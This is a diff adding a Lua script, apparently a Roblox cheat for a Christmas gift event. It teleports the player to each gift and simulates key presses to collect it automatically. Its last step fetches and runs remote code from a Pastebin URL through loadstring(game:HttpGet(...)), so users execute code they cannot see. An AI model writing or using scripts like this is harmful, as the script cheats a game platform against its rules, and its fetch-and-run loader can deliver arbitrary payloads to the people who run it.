@@ -1,0 +1,47 @@
+wait(3)
+while not game:IsLoaded() do
+    wait(0.1)
+end
+local camera = workspace.CurrentCamera
+local GIFTLIST = {}
+if ( game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded) then
+_G.Stop = true
+local virtualUser = game:GetService('VirtualUser')
+while _G.Stop and wait() do
+
+game:GetService("Players").LocalPlayer.PlayerGui.Frames.ChristimaEvent.Visible = false
+for i,v in pairs(game:GetService("Workspace").GIFTS:GetChildren()) do
+repeat
+    spawn(function()
+    if not pcall(function() return game:GetService("Players").LocalPlayer.PlayerGui.ProximityPrompts.Prompt end) then
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Box.CFrame
+    virtualUser:SetKeyUp('0x65')
+    end
+    end)
+        camera.FieldOfView = 120
+pcall(function()
+if pcall(function() return game:GetService("Players").LocalPlayer.PlayerGui.ProximityPrompts.Prompt end) then
+local virtualUser = game:GetService('VirtualUser')
+virtualUser:CaptureController()
+virtualUser:SetKeyDown('0x65')
+wait(2)
+virtualUser:SetKeyUp('0x65')
+end
+end)
+wait()
+until not _G.Stop or not v.Parent
+wait()
+end
+pcall(function()
+local children = game:GetService("Workspace").GIFTS:GetChildren()
+local count = #children
+print(count)
+if count <= 0 then
+pcall(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/7q2gRNut",true))()
+    _G.Stop = false
+end)
+end
+end)    
+end
+end
